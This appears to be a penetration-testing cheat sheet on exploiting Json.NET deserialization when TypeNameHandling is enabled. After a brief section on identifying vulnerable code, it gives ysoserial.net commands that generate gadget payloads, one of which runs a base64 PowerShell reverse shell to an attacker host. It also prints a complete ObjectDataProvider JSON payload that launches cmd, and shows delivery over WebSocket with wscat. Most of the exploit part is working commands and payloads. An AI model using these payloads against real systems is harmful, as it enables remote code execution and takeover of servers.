# .NET Json.NET Deserialization

Json.NET (Newtonsoft.Json) with `TypeNameHandling` set to `All`, `Auto`, or `Objects` deserializes `$type` fields from JSON — enabling instantiation of arbitrary .NET types and RCE via gadget chains.

## Identify

Look for JSON containing `$type` fields in requests/responses, or source code with:
```csharp
JsonConvert.DeserializeObject<T>(json, new JsonSerializerSettings {
    TypeNameHandling = TypeNameHandling.Auto  // or .All
});
```

## Exploit

Generate a payload with ysoserial.net:
```powershell
# Windows: ysoserial.exe
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "cmd /c ping <LHOST>"
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "powershell -e <BASE64_REVSHELL>"

# Common gadgets: ObjectDataProvider, WindowsIdentity
```

Payload looks like:
```json
{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
  "MethodName": "Start",
  "MethodParameters": {
    "$type": "System.Collections.ArrayList, mscorlib",
    "$values": ["cmd", "/c ping <LHOST>"]
  },
  "ObjectInstance": {
    "$type": "System.Diagnostics.Process, System"
  }
}
```

## .NET WebSocket + JSON deserialization

If the app speaks over WebSocket with JSON messages and accepts `$type`:
```bash
# Use wscat to interact:
wscat -c ws://<TARGET>:<PORT>
# Send: {"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework",...}
```
